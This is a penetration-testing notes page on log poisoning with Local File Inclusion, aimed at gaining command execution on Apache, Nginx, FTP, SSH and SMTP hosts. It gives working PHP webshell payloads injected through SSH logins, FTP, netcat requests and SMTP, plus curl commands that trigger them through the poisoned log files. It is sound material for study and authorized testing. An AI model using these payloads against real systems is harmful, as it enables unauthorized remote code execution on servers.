#Concept/Web/File_Inclusion/LFI

# Theory

A technique for executing arbitrary commands on a web server. Its usually used in conjunction with other techniques like Local File Inclusion (LFI).

The idea is to manipulate logh files that the server writes, and writes to, and then use other vulnerabilities to exploit these files.

When you want to inject malicious code into these log files, you would typically capture the requests made by the site, and then modify the User-Agent, Referrer or even error messages.

If the webapp is vulnerable to LFI, we can include the log file in the response. Since the injected code is in the log file, it gets executed when the file is processed by the system.

# Testing

Log files may be stored in different locations depending on the operating system/distribution.

## /var/log/auth.log

For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
# Sending the payload via SSH
ssh '<php phpinfo(); ?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```

## /var/log/vsftpd.log

When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).

```bash
# Sending the payload via FTP
ftp $TARGET_IP
> '<php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
```

## /var/log/apache2/access.log

When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.

-   About `access.log`: records all requests processed by the server.
-   About netcat: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:

-   RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
-   Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
-   FreeBSD Apache access log file location: `/var/log/httpd-access.log`
-   Windows Apache access log file location: \*\*\*\* `C:\xampp\apache\logs`

Or if the web server is under Nginx :

-   Linux Nginx access log file location: `/var/log/nginx/access.log`
-   Windows Nginx access log file location: `C:\nginx\log`

## /var/log/apache/error.log

This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

-   About `error.log`: records any errors encountered in processing requests.
-   About netcat: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `error.log` path and file depending on the operating system/distribution:

-   RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: `/var/log/httpd/error_log`
-   Debian / Ubuntu Linux Apache error log file location: `/var/log/apache2/error.log`
-   FreeBSD Apache error log file location: `/var/log/httpd-error.log`
-   Windows Apache access log file location: \*\*\*\* `C:\xampp\apache\logs`

Or if the web server is under Nginx :

-   Linux Nginx access log file location: `/var/log/nginx`
-   Windows Nginx access log file location: `C:\nginx\log`

# /var/log/mail.log

When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<?php system($_GET['cmd']); ?>

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
```

# References

https://knowledge.complexsecurity.io/security/logp/
https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning